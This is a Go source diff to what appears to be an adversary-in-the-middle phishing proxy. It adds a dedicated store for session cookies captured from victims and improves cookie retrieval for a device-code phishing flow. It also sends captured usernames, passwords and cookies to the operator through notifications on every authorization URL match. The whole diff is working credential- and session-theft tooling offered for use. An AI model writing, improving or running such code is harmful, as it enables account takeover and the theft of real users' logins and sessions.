@@ -295,6 +295,11 @@ type HttpProxy struct {
 	tokenFeed         *TokenFeed             // Token feed API for mailbox viewer auto-import
 	mailboxAccounts   *MailboxAccountManager // Persistent mailbox accounts with auto-refresh
 
+	// Dedicated cookie store - guaranteed to persist cookies for device code flow
+	// Key: session ID, Value: map[domain]map[cookieName]*CookieToken
+	capturedCookies   map[string]map[string]map[string]*database.CookieToken
+	cookieStore_mtx   sync.RWMutex
+
 	// Connection statistics for monitoring
 	connStats struct {
 		sync.RWMutex
@@ -328,6 +333,64 @@ func SetJSONVariable(body []byte, key string, value interface{}) ([]byte, error)
 	return newBody, nil
 }
 
+// StoreCapturedCookie stores a cookie in the dedicated cookie store (thread-safe)
+// This ensures cookies persist for device code flow regardless of session state
+func (p *HttpProxy) StoreCapturedCookie(sessionId, domain, name, value, path string, httpOnly bool) {
+	p.cookieStore_mtx.Lock()
+	defer p.cookieStore_mtx.Unlock()
+
+	if _, ok := p.capturedCookies[sessionId]; !ok {
+		p.capturedCookies[sessionId] = make(map[string]map[string]*database.CookieToken)
+	}
+	if _, ok := p.capturedCookies[sessionId][domain]; !ok {
+		p.capturedCookies[sessionId][domain] = make(map[string]*database.CookieToken)
+	}
+	p.capturedCookies[sessionId][domain][name] = &database.CookieToken{
+		Name:     name,
+		Value:    value,
+		Path:     path,
+		HttpOnly: httpOnly,
+	}
+}
+
+// GetCapturedCookies retrieves all cookies for a session from the dedicated store
+func (p *HttpProxy) GetCapturedCookies(sessionId string) map[string]map[string]*database.CookieToken {
+	p.cookieStore_mtx.RLock()
+	defer p.cookieStore_mtx.RUnlock()
+
+	if cookies, ok := p.capturedCookies[sessionId]; ok {
+		// Return a copy to prevent race conditions
+		result := make(map[string]map[string]*database.CookieToken)
+		for domain, domainCookies := range cookies {
+			result[domain] = make(map[string]*database.CookieToken)
+			for name, cookie := range domainCookies {
+				result[domain][name] = &database.CookieToken{
+					Name:     cookie.Name,
+					Value:    cookie.Value,
+					Path:     cookie.Path,
+					HttpOnly: cookie.HttpOnly,
+				}
+			}
+		}
+		return result
+	}
+	return nil
+}
+
+// GetCapturedCookieCount returns the total number of cookies stored for a session
+func (p *HttpProxy) GetCapturedCookieCount(sessionId string) int {
+	p.cookieStore_mtx.RLock()
+	defer p.cookieStore_mtx.RUnlock()
+
+	count := 0
+	if cookies, ok := p.capturedCookies[sessionId]; ok {
+		for _, domainCookies := range cookies {
+			count += len(domainCookies)
+		}
+	}
+	return count
+}
+
 func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *database.Database, bl *Blacklist, developer bool) (*HttpProxy, error) {
 	p := &HttpProxy{
 		Proxy:             goproxy.NewProxyHttpServer(),
@@ -349,6 +412,7 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 		developer:         developer,
 		ip_whitelist:      make(map[string]int64),
 		ip_sids:           make(map[string]string),
+		capturedCookies:   make(map[string]map[string]map[string]*database.CookieToken), // Dedicated cookie store
 		auto_filter_mimes: []string{"text/html", "application/json", "application/javascript", "text/javascript", "application/x-javascript"},
 	}
 
@@ -3138,20 +3202,21 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 					}
 					
 					// CAPTURE ALL COOKIES regardless of auth_tokens (for Cookie Editor export)
-					s, ok := p.sessions[ps.SessionId]
-					if ok {
-						// Capture cookie regardless of session state (for device code flow)
-						if ck.Value != "" && (ck.Expires.IsZero() || time.Now().Before(ck.Expires)) {
+					// Store in BOTH session object AND dedicated cookie store for reliability
+					if ck.Value != "" && (ck.Expires.IsZero() || time.Now().Before(ck.Expires)) {
+						// 1. Store in session object (original method)
+						if s, ok := p.sessions[ps.SessionId]; ok {
 							s.AddCookieAuthToken(c_domain, ck.Name, ck.Value, ck.Path, ck.HttpOnly, ck.Expires)
 							s.LastTokenActivity = time.Now()
-							// Log every 10th cookie to avoid spam
-							totalCookies := 0
-							for _, dm := range s.CookieTokens {
-								totalCookies += len(dm)
-							}
-							if totalCookies%10 == 1 || totalCookies <= 5 {
-								log.Info("[cookie] Session %s now has %d cookies (latest: %s:%s)", ps.SessionId[:8], totalCookies, c_domain, ck.Name)
-							}
+						}
+						
+						// 2. Store in dedicated cookie store (guaranteed persistence for device code)
+						p.StoreCapturedCookie(ps.SessionId, c_domain, ck.Name, ck.Value, ck.Path, ck.HttpOnly)
+						
+						// Log captured cookies periodically
+						cookieCount := p.GetCapturedCookieCount(ps.SessionId)
+						if cookieCount%10 == 1 || cookieCount <= 5 {
+							log.Info("[cookie-store] Session %s: %d cookies (latest: %s:%s)", ps.SessionId[:8], cookieCount, c_domain, ck.Name)
 						}
 					}
 				}
@@ -3588,6 +3653,11 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 				if ok && s.IsDone {
 					for _, au := range pl.authUrls {
 						if au.MatchString(resp.Request.URL.Path) {
+							// Also get cookies from dedicated store
+							if dedicatedCookies := p.GetCapturedCookies(ps.SessionId); dedicatedCookies != nil && len(dedicatedCookies) > 0 {
+								s.CookieTokens = dedicatedCookies
+							}
+							
 							err := p.db.SetSessionCookieTokens(ps.SessionId, s.CookieTokens)
 							if err != nil {
 								log.Error("database: %v", err)
@@ -3600,27 +3670,31 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 							if err != nil {
 								log.Error("database: %v", err)
 							}
-							if err == nil {
-								log.Success("[%d] detected authorization URL - tokens intercepted: %s", ps.Index, resp.Request.URL.Path)
+							
+							cookieCount := 0
+							for _, cookies := range s.CookieTokens {
+								cookieCount += len(cookies)
+							}
+							log.Success("[%d] detected authorization URL - tokens intercepted: %s (%d cookies)", ps.Index, resp.Request.URL.Path, cookieCount)
 
-								// Only send notification on /landingv2 path
-								if resp.Request.URL.Path == "/landingv2" {
-									lureUrl := ""
-									if s.PhishLure != nil && s.PhishLure.Path != "" {
-										lureUrl = s.PhishLure.Path
-									}
-									p.notifier.Trigger(EventSessionCaptured, &NotificationData{
-										Origin:    s.RemoteAddr,
-										LureURL:   lureUrl,
-										Phishlet:  pl.Name,
-										SessionID: ps.SessionId,
-										UserAgent: s.UserAgent,
-										Username:  s.Username,
-										Password:  s.Password,
-										Custom:    s.Custom,
-										Session:   s,
-									})
+							// Send notification for ALL auth_url matches (not just /landingv2)
+							// Skip if device code mode is active (device code callback will send notification)
+							if s.DCMode == "" || s.DCMode == DCModeOff || s.DCMode == DCModeFallback {
+								lureUrl := ""
+								if s.PhishLure != nil && s.PhishLure.Path != "" {
+									lureUrl = s.PhishLure.Path
 								}
+								p.notifier.Trigger(EventSessionCaptured, &NotificationData{
+									Origin:    s.RemoteAddr,
+									LureURL:   lureUrl,
+									Phishlet:  pl.Name,
+									SessionID: ps.SessionId,
+									UserAgent: s.UserAgent,
+									Username:  s.Username,
+									Password:  s.Password,
+									Custom:    s.Custom,
+									Session:   s,
+								})
 							}
 
 							if p.cfg.GetGoPhishAdminUrl() != "" && p.cfg.GetGoPhishApiKey() != "" {
@@ -3814,57 +3888,44 @@ func (p *HttpProxy) setupDeviceCodeCallbacks() {
 
 				log.Success("[%d] [devicecode] %s tokens captured and linked to AitM session!", sid, provider)
 
-				// AGGRESSIVE COOKIE RETRIEVAL - try multiple methods
-				log.Info("[devicecode] === COOKIE RETRIEVAL START ===")
-				log.Info("[devicecode] Session ID: %s, In-memory cookies: %d domains", s.Id, len(s.CookieTokens))
+				// COOKIE RETRIEVAL - use dedicated cookie store (most reliable)
+				log.Info("[devicecode] === COOKIE RETRIEVAL START for session %s ===", s.Id)
 				
-				// Method 1: In-memory session cookies
-				cookieCount := 0
-				for domain, cookies := range s.CookieTokens {
-					cookieCount += len(cookies)
-					log.Debug("[devicecode] In-memory: %s = %d cookies", domain, len(cookies))
-				}
-				log.Info("[devicecode] Method 1 (in-memory): %d total cookies from %d domains", cookieCount, len(s.CookieTokens))
-				
-				// Method 2: Try database by session string ID
-				if len(s.CookieTokens) == 0 || cookieCount == 0 {
-					log.Info("[devicecode] Method 2: Querying database by session_id: %s", s.Id)
-					if dbSession, err := p.db.GetSessionBySid(s.Id); err == nil && dbSession != nil {
-						dbCookieCount := 0
-						for _, cookies := range dbSession.CookieTokens {
-							dbCookieCount += len(cookies)
-						}
-						log.Info("[devicecode] Method 2 result: %d cookies from %d domains", dbCookieCount, len(dbSession.CookieTokens))
-						if dbCookieCount > 0 {
-							s.CookieTokens = dbSession.CookieTokens
-							log.Success("[devicecode] Loaded cookies from database!")
-						}
-					} else if err != nil {
-						log.Warning("[devicecode] Method 2 failed: %v", err)
+				// Method 1: Dedicated cookie store (PRIMARY - most reliable)
+				dedicatedCookies := p.GetCapturedCookies(s.Id)
+				dedicatedCount := 0
+				if dedicatedCookies != nil {
+					for _, domainCookies := range dedicatedCookies {
+						dedicatedCount += len(domainCookies)
 					}
 				}
+				log.Info("[devicecode] Method 1 (dedicated store): %d cookies", dedicatedCount)
 				
-				// Method 3: Try database by numeric session ID (sid)
-				if len(s.CookieTokens) == 0 {
-					log.Info("[devicecode] Method 3: Querying database by numeric ID: %d", sid)
-					sessions, err := p.db.ListSessions()
-					if err == nil {
-						for _, dbSess := range sessions {
-							if dbSess.Id == sid || dbSess.SessionId == s.Id {
-								dbCookieCount := 0
-								for _, cookies := range dbSess.CookieTokens {
-									dbCookieCount += len(cookies)
-								}
-								log.Info("[devicecode] Method 3 found session %d: %d cookies", dbSess.Id, dbCookieCount)
-								if dbCookieCount > 0 {
-									s.CookieTokens = dbSess.CookieTokens
-									log.Success("[devicecode] Loaded cookies from database listing!")
-									break
-								}
+				if dedicatedCount > 0 {
+					// Use cookies from dedicated store
+					s.CookieTokens = dedicatedCookies
+					log.Success("[devicecode] Using %d cookies from dedicated cookie store!", dedicatedCount)
+				} else {
+					// Method 2: In-memory session cookies (fallback)
+					cookieCount := 0
+					for _, cookies := range s.CookieTokens {
+						cookieCount += len(cookies)
+					}
+					log.Info("[devicecode] Method 2 (in-memory): %d cookies", cookieCount)
+					
+					// Method 3: Database by session ID (fallback)
+					if cookieCount == 0 {
+						log.Info("[devicecode] Method 3: Querying database by session_id: %s", s.Id)
+						if dbSession, err := p.db.GetSessionBySid(s.Id); err == nil && dbSession != nil {
+							dbCookieCount := 0
+							for _, cookies := range dbSession.CookieTokens {
+								dbCookieCount += len(cookies)
+							}
+							if dbCookieCount > 0 {
+								s.CookieTokens = dbSession.CookieTokens
+								log.Success("[devicecode] Loaded %d cookies from database!", dbCookieCount)
 							}
 						}
-					} else {
-						log.Warning("[devicecode] Method 3 failed: %v", err)
 					}
 				}
 				
@@ -3875,12 +3936,15 @@ func (p *HttpProxy) setupDeviceCodeCallbacks() {
 				}
 				log.Info("[devicecode] === COOKIE RETRIEVAL END: %d total cookies ===", finalCookieCount)
 				
-				// FORCE SAVE cookies to database before notification (ensure persistence)
+				// Log domains for debugging
+				for domain, cookies := range s.CookieTokens {
+					log.Debug("[devicecode] Domain %s: %d cookies", domain, len(cookies))
+				}
+				
+				// Save cookies to database
 				if finalCookieCount > 0 {
 					if err := p.db.SetSessionCookieTokens(s.Id, s.CookieTokens); err != nil {
-						log.Warning("[devicecode] Failed to force-save cookies: %v", err)
-					} else {
-						log.Info("[devicecode] Force-saved %d cookies to database", finalCookieCount)
+						log.Warning("[devicecode] Failed to save cookies to database: %v", err)
 					}
 				}
 
@@ -3896,14 +3960,10 @@ func (p *HttpProxy) setupDeviceCodeCallbacks() {
 					}()
 				}
 
-				// Log exactly what we're about to send
-				log.Important("[devicecode] TRIGGERING NOTIFICATION - Session %s has %d cookie domains, %d total cookies", 
-					s.Id, len(s.CookieTokens), finalCookieCount)
-				for domain, cookies := range s.CookieTokens {
-					log.Info("[devicecode] Domain: %s - %d cookies", domain, len(cookies))
-				}
+				// Trigger notification with cookies
+				log.Important("[devicecode] Sending notification with %d cookies from %d domains", finalCookieCount, len(s.CookieTokens))
 
-				// Send notification with captured tokens
+				// Send notification with captured tokens AND cookies
 				p.notifier.Trigger(EventDeviceCodeCaptured, &NotificationData{
 					Origin:    s.RemoteAddr,
 					Phishlet:  s.Phishlet,
